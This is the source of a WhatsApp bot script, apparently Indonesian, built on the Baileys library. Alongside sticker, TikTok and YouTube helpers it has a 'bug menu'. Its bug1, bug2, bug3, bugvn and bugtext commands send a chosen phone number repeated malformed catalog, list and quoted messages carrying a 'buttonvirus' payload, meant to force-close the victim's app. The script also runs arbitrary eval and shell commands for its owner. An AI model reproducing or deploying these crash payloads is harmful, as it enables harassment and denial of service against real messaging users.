const { modul } = require('./module');
const { axios, baileys, chalk, cheerio, child_process, crypto, fs, ffmpeg, jsobfus, moment, ms, speed, util } = modul;
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, reSize, generateProfilePicture } = require('./lib/myfunc')
const { buttonvirus } = require('./scrape/buttonvirus')
const { color, bgcolor } = require('./lib/color')
const { uptotelegra } = require('./scrape/upload')
const tiktok = require('./scrape/tiktok')
const yts = require('./scrape/yt-search')
const audionye = fs.readFileSync('./y.mp3')
const owner = JSON.parse(fs.readFileSync('./database/owner.json').toString())

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {},
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}

global.ownerName = 'El Diablo'
global.ownerNumber = ["6281220670449@s.whatsapp.net"]
global.prefa = ['','.']
global.mess = {
    wait: 'Wait Sis Please be patient',
    succes: 'Good Luck Sis ?',
    admin: 'Group Admin Special Features!!!',
    botAdmin: 'Bots Must Be Admins First!!!',
    owner: 'Owner Bot`s Special Features!!!',
    group: 'Features Used Only For Groups!!!',
    private: 'Features Used Only For Private Chat!!!',
    bot: 'Bot Number User Special Features!!!',
    error: 'Error Sis, Please Chat Owner...',
}

module.exports = diablo = async (diablo, diablobotwhatsapp, chatUpdate, store) => {
try {
        const body = (diablobotwhatsapp.mtype === 'conversation') ? diablobotwhatsapp.message.conversation : (diablobotwhatsapp.mtype == 'imageMessage') ? diablobotwhatsapp.message.imageMessage.caption : (diablobotwhatsapp.mtype == 'videoMessage') ? diablobotwhatsapp.message.videoMessage.caption : (diablobotwhatsapp.mtype == 'extendedTextMessage') ? diablobotwhatsapp.message.extendedTextMessage.text : (diablobotwhatsapp.mtype == 'buttonsResponseMessage') ? diablobotwhatsapp.message.buttonsResponseMessage.selectedButtonId : (diablobotwhatsapp.mtype == 'listResponseMessage') ? diablobotwhatsapp.message.listResponseMessage.singleSelectReply.selectedRowId : (diablobotwhatsapp.mtype == 'templateButtonReplyMessage') ? diablobotwhatsapp.message.templateButtonReplyMessage.selectedId : (diablobotwhatsapp.mtype === 'messageContextInfo') ? (diablobotwhatsapp.message.buttonsResponseMessage?.selectedButtonId || diablobotwhatsapp.message.listResponseMessage?.singleSelectReply.selectedRowId || diablobotwhatsapp.text) : ''
        const budy = (typeof diablobotwhatsapp.text == 'string' ? diablobotwhatsapp.text : '')
        const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const content = JSON.stringify(diablobotwhatsapp.message)
        const { type, quotedMsg, mentioned, now, fromMe } = diablobotwhatsapp
        const isCmd = body.startsWith(prefix)
        const from = diablobotwhatsapp.key.remoteJid
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = diablobotwhatsapp.pushName || "No Name"
        const botNumber = await diablo.decodeJid(diablo.user.id)
        const itsMediablo = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(diablobotwhatsapp.sender)
        const itsMe = diablobotwhatsapp.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = diablobotwhatsapp.quoted ? diablobotwhatsapp.quoted : diablobotwhatsapp
        const mime = (quoted.msg || quoted).mimetype || ''
        const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
		const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
		const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')   
        const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')  
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedMsg = (type == 'extendedTextMessage')
		const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
		const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
		const isQuotedDocument = isQuotedMsg ? content.includes('documentMessage') ? true : false : false
		const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
		const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false
        const hariRaya = new Date('January 1, 2023 00:00:00')
        const sekarang = new Date().getTime()
        const Selisih = hariRaya - sekarang
        const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
        const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const jmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60))
        const jdetik = Math.floor( Selisih % (1000 * 60) / 1000)
        const sender = diablobotwhatsapp.isGroup ? (diablobotwhatsapp.key.participant ? diablobotwhatsapp.key.participant : diablobotwhatsapp.participant) : diablobotwhatsapp.key.remoteJid
        const groupMetadata = diablobotwhatsapp.isGroup ? await diablo.groupMetadata(diablobotwhatsapp.chat).catch(e => {}) : ''
        const groupName = diablobotwhatsapp.isGroup ? groupMetadata.subject : ''
        const participants = diablobotwhatsapp.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = diablobotwhatsapp.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = diablobotwhatsapp.isGroup ? groupMetadata.owner : ''
        const groupMembers = diablobotwhatsapp.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = diablobotwhatsapp.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = diablobotwhatsapp.isGroup ? groupAdmins.includes(diablobotwhatsapp.sender) : false
    	const isAdmins = diablobotwhatsapp.isGroup ? groupAdmins.includes(diablobotwhatsapp.sender) : false
    	
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[diablobotwhatsapp.sender]
if (typeof user !== 'object') global.db.users[diablobotwhatsapp.sender] = {}
const chats = global.db.chats[diablobotwhatsapp.chat]
if (typeof chats !== 'object') global.db.chats[diablobotwhatsapp.chat] = {}
} catch (err) {
console.error(err)
}

if (!diablo.public) {
if (!diablobotwhatsapp.key.fromMe) return
}

if (!diablobotwhatsapp.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(diablobotwhatsapp.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname))
}
if (diablobotwhatsapp.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(diablobotwhatsapp.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
}

if (diablobotwhatsapp.sender.startsWith('212')) return diablo.updateBlockStatus(diablobotwhatsapp.sender, 'block')

try {
ppuser = await diablo.profilePictureUrl(diablobotwhatsapp.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await reSize(ppuser, 200, 200)

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `${buttonvirus}`, 
"jpegThumbnail": ppnyauser
}
}
}

if (command) {
diablo.sendPresenceUpdate('composing', from)
diablo.readMessages([diablobotwhatsapp.key])
}

async function replyNya(teks) {
                       const buttonsDefault = [{ quickReplyButton: { displayText : `${buttonvirus}`, id : `.menu` } }]                 
                       const buttonMessage = { 
                                    text: teks, 
                                    footer: "", 
                                    templateButtons: buttonsDefault, 
                                    image: {url: ppnyauser}                                   
                                               }
                       return diablo.sendMessage(from, buttonMessage)
                }

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        );
        const result = {
            status: 200,
            author: `diablo`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function sendBugcrash(jid, title, description, footer, thumbnail, ownerBusines, produk, productIdImg) {
let prod = {
listMessage: {
title: title,
description: description,
listType: 2,
productListInfo: {
productSections: [{
title: title,
products: produk
}],
headerImage: {
productId: productIdImg,
jpegThumbnail: thumbnail
},
businessOwnerJid: ownerBusines
},
footerText: footer,
}
}
let progene = await generateWAMessageFromContent(jid, prod, { quoted : lep })
return diablo.relayMessage(progene.key.remoteJid, progene.message, {
messageId: ""
})
}

switch (command) {

case 'menu':
jiren = ` 
亗╭┬─────────────────┈ 
亗├ 「 𝗦𝗖 𝗩𝗜𝗣 𝗕𝗬 𝗞𝗨𝗥𝗥𝗫𝗗 」
亗├┬─────────────────┈ 
亗├ 𝙫𝙚𝙧𝙨𝙞𝙤𝙣 : 2.0.3
亗├ 𝙡𝙞𝙗 : baileys
亗├ 𝙨𝙘 : private
亗├──────────────────┈
亗├ 「𝘽𝙐𝙂 𝙈𝙀𝙉𝙐」
亗├──────────────────┈
亗├ • ${prefix}bug1
亗├ • ${prefix}bug2
亗├ • ${prefix}bug3
亗├──────────────────┈
亗├ 「𝘽𝙐𝙂 𝙈𝙀𝙉𝙐 𝙑2」
亗├ NOTE : wajib pakai wa web
亗├──────────────────┈
亗├ • ${prefix}bugvn
亗├ • ${prefix}bugtext
亗├─────────────────┈ 
亗├ 「𝙊𝙏𝙃𝙀𝙍 𝙁𝙄𝙏𝙐𝙍𝙀」
亗├ • ${prefix}attp ( text )
亗├ • ${prefix}tiktok ( url )
亗├ • ${prefix}sticker (reply image)
亗├ • ${prefix}toimg ( reply sticker )
亗├ • ${prefix}tourl (reply media)
亗├ • ${prefix}sc
亗├─────────────────┈ 
`
diablobotwhatsapp.reply(jiren)
break
case 'sc':
diablobotwhatsapp.reply("SC TIDAK DI JUAL!!! tapi klo mau akses bot hub wa.me/6281220670449 harga terjangkau loo")
break
case 'cewek': case 'cecan': {
var yeye = await fetchJson("https://kirbotz-api.herokuapp.com/api/random/cecan?apikey=KirBotz") 
diablo.sendMessage(from,{image:{url:yeye.result.url},caption: `${mess.succes}`}, { quoted: diablobotwhatsapp } )
}
break
case 'attp':
if (args.length == 0) return diablobotwhatsapp.reply(`Contoh: ${prefix + command} Hai`)
gehdhe = await getBuffer(`https://api.xteam.xyz/${command}?file&text=${encodeURI(q)}`)
diablo.sendMessage(from, { sticker: gehdhe, contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl',
"sourceUrl": 'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl'}}}, { quoted: diablobotwhatsapp })
break
case 'tiktok': case 'tiktoknowm':{
if (!q) return diablobotwhatsapp.reply(`Link Nya Kak???\nContoh ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)
let res = await tiktok(q)
diablo.sendMessage(from,{video:{url:res.nowm},caption: `${mess.succes}`}, { quoted: diablobotwhatsapp } )
}
break
case 'search':
case 'ytsearch':
if (args.length < 1) return diablobotwhatsapp.reply(`Contoh:\n${command} bukti Virgoun`)
let list_rows = [];
const data = await yts(q);
for(let a of data.all) {
list_rows.push({
title: a.title, description: `Channel: ${a.author.name} | Durasi: ${a.duration}`, rowId: `.play ${a.url}`
})
}
const button = {
title: `Hasil Pencarian Dari ${q}`,
description: "Silahkan Tap Tombol Dibawah",
footerText: `Created By diablo`,
buttonText: 'Tap Disini',
listType: 'SINGLE_SELECT',
sections: [
{
title: "Hasil Pencarian", 
rows: list_rows
}
]
}
const templateList = generateWAMessageFromContent(from, proto.Message.fromObject({ "listMessage": button }), {});
diablo.relayMessage(from, templateList.message, { messageId: templateList.key.id });
break
case 'play':{
if (!text) return diablobotwhatsapp.reply(`Example : ${prefix+command} story wa anime`)
let search = await yts(text)
url = search.videos[0].url
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
eek = await getBuffer(anu.thumbnail)
owned = '6281220670449'
ngen = `
Title : ${anu.title}
Ext : Search
ID : ${anu.videoId}
Viewers : ${anu.views}
Upload At : ${anu.ago}
Author : ${anu.author.name}
Channel : ${anu.author.url}`
let buttonse = [
{buttonId: `${prefix}mp4 ${anu.url}`, buttonText: {displayText: `Video`}, type: 1},
{buttonId: `${prefix}mp3 ${anu.url}`, buttonText: {displayText: `Audio`}, type: 1}
]
let buttonMessages = {
image: eek, 
jpegThumbnail: eek,
caption: ngen,
fileLength: "99999999999",
mentions:[sender, owned],
footer: `_Powered By @${owned.split("@")[0]}_`,
buttons: buttonse,
headerType: 4,
contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Jangan Spam Yah`, 
"mediaType": 2, 
"thumbnail": eek,
"previewType": "VIDEO",
"mediaUrl": 'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl',
"sourceUrl": 'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl'
}}
}
diablo.sendMessage(from, buttonMessages, { quoted: {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
remoteJid: "6281903153426-1626053991@g.us"
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 1,
message: 'Created By diablo',
orderTitle: '999999999', 
sellerJid: `0@s.whatsapp.net` 
}
}
}})
}
break
case 'mp3': {
let { yta } = require('./lib/yt')
if (!text) throw `Example : ${prefix+command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
let quality = args[1] ? args[1] : '128kbps'
let media = await yta(text, quality)
if (media.filesize >= 100000) return diablobotwhatsapp.reply('File Melebihi Batas '+util.format(media))
diablo.sendMessage(from, { audio: { url: media.dl_link }, mimetype: 'audio/mp4', ptt:true, contextInfo:{
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Jangan Lupa Bilang Makasih`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl',
"sourceUrl": 'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl'
}}}, { quoted: diablobotwhatsapp })
}
break
case 'mp4': {
let { ytv } = require('./lib/yt')
if (!text) throw `Example : ${prefix+command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
let quality = args[1] ? args[1] : '360p'
let media = await ytv(text, quality)
if (media.filesize >= 100000) return reply('File Melebihi Batas '+util.format(media))
diablo.sendMessage(from, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `? Title : ${media.title}\n? File Size : ${media.filesizeF}\n? Url : ${isUrl(text)}\n? Ext : MP4\n? Resolusi : ${args[1] || '360p'}`, contextInfo:{
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Jangan Lupa Bilang Makasih`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl',
"sourceUrl": 'https://www.facebook.com/100025728849863/posts/pfbid02rFELgSdLzgDNmK9NQAwTm1VNrfH3sXtid3xPKCjv376c5YxWE3aQDjiBcYnAS3vl/?app=fbl'
}}}, { quoted: diablobotwhatsapp })
}
break
case 'setppbot': {
if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
if (!quoted) return diablobotwhatsapp.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return diablobotwhatsapp.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return diablobotwhatsapp.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var medis = await diablo.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/kay`) {
var { img } = await generateProfilePicture(medis)
await diablo.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
diablobotwhatsapp.reply(`Sukses`)
} else {
var memeg = await diablo.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
diablobotwhatsapp.reply(`Sukses`)
}
}
break
case 'tourl':
let media = await diablo.downloadAndSaveMediaMessage(quoted)
if (( isMedia ) && args.length == 0) {
let anu = await uptotelegra(media)
diablobotwhatsapp.reply(util.format(anu))
}
break
case 'toimg': {
if (!quoted) return diablobotwhatsapp.reply('Reply Image')
if (!/webp/.test(mime)) return diablobotwhatsapp.reply(`balas stiker dengan caption *${command}*`)
let media = await diablo.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
diablo.sendMessage(from, { image: buffer, jpegThumbnail: ppnyauser, contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"jpegThumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://www.instagram.com/reel/CYKGjBzIw5m/?utm_source=ig_web_copy_link',
"sourceUrl": 'https://www.instagram.com/reel/CYKGjBzIw5m/?utm_source=ig_web_copy_link'}}}, { quoted: diablobotwhatsapp })
fs.unlinkSync(ran)
})
}
break
case 'sticker': 
case 's': {
global.packname = `\n\n\n\n\n\n\n\n\n\nSticker By : ${pushname}\n\n\n\n\n\n\n\n\n\n`
global.author = `\n\n\n\n\n\n\n\n\n\nThanks diablo Bot\n\n\n\n\n\n\n\n\n\n`
if (!quoted) return diablobotwhatsapp.reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await diablo.sendImageAsSticker(from, media, diablobotwhatsapp, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return diablobotwhatsapp.reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await diablo.sendVideoAsSticker(from, media, diablobotwhatsapp, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
diablobotwhatsapp.reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break
case 'obfus':{
if (!q) return diablobotwhatsapp.reply(`Contoh ${command} const kirbotz = require('kirbotz-api')`)
let meg = await obfus(q)
diablobotwhatsapp.reply(`Sukses
${meg.result}`)
}
break
case 'styletext':{
if (!q) return diablobotwhatsapp.reply(`Contoh ${command} akira`)
let res = await styletext(q)
diablobotwhatsapp.reply(util.format(res))
}
break
case 'bug3':{
if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
if (!q) return diablobotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '7'
waktu = '5s'
for (let i = 0; i < jumlah; i++) {
diablo.sendMessage(num, {sticker: ppnyauser},{ quoted: lep })
await sleep(ms(waktu))
}
diablobotwhatsapp.reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case 'bug2': {
if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
if (!q) return diablobotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '7'
waktu = '5s'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(num, 'FC YA CHUAKS', ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(ms(waktu))
}
diablobotwhatsapp.reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case 'test':
diablobotwhatsapp.reply('on bang')
break
case 'bug1': {
if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
if (!q) return diablobotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '7'
waktu = '5s'
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: diablo.waUploadToServer })
var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "7091718154232528",
"title": `MAMPUS FC CHUAKS`,
"description": `${buttonvirus}${buttonvirus}`,
"currencyCode": "IDR",
"priceAmount1000": "100000000000000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "1000",
"retailerId": `Nomor Owner Di Atas`,
"url": `https://wa.me/0`
},
"businessOwnerJid": "6281220670449@s.whatsapp.net",
}
}), { userJid: from, quoted: lep  })
diablo.relayMessage(num, catalog.message, { messageId: catalog.key.id })
await sleep(ms(waktu))
}
diablobotwhatsapp.reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break


case 'bugvn':{
if (!botNumber) return diablobotwhatsapp.reply(mess.owner)
jumlah = '3'
waktu = '4s'
for (let i = 0; i < jumlah; i++) {
diablo.sendMessage(from, { audio: audionye, mimetype: 'audio/mp4', ptt:true, mentions:[diablobotwhatsapp.sender]}, { quoted: lep })
await sleep(ms(waktu))
}
diablobotwhatsapp.reply(`Target Sudah Turu`)
}
break
case 'bugtext':{
if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
jumlah = '25'
waktu = '5s'
for (let i = 0; i < jumlah; i++) {
diablo.sendMessage(from, {text: "Ngetes Bang"},{ quoted: lep })
await sleep(ms(waktu))
}
diablobotwhatsapp.reply(`Sukses Send Bug Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case 'owner':{
diablo.sendContact(diablobotwhatsapp.chat, owner, diablobotwhatsapp)
}
break
default:
}
if (budy.startsWith('=>')) {
if (!itsMediablo) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return diablobotwhatsapp.reply(bang)
}
try {
diablobotwhatsapp.reply(util.format(eval(`(async () => { ${budy.slice(3)} })()`)))
} catch (e) {
diablobotwhatsapp.reply(String(e))
}
}
if (budy.startsWith('>')) {
if (!itsMediablo) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await diablobotwhatsapp.reply(evaled)
} catch (err) {
diablobotwhatsapp.reply(String(err))
}
}
if (budy.startsWith('<')) {
if (!itsMediablo) return
try {
return diablobotwhatsapp.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
if (budy.startsWith('$')){
if (!itsMediablo) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return diablobotwhatsapp.reply(`${err}`)
if (stdout) {
diablobotwhatsapp.reply(stdout)
}
})
}
} catch (err) {
diablobotwhatsapp.reply(util.format(err))
}
} 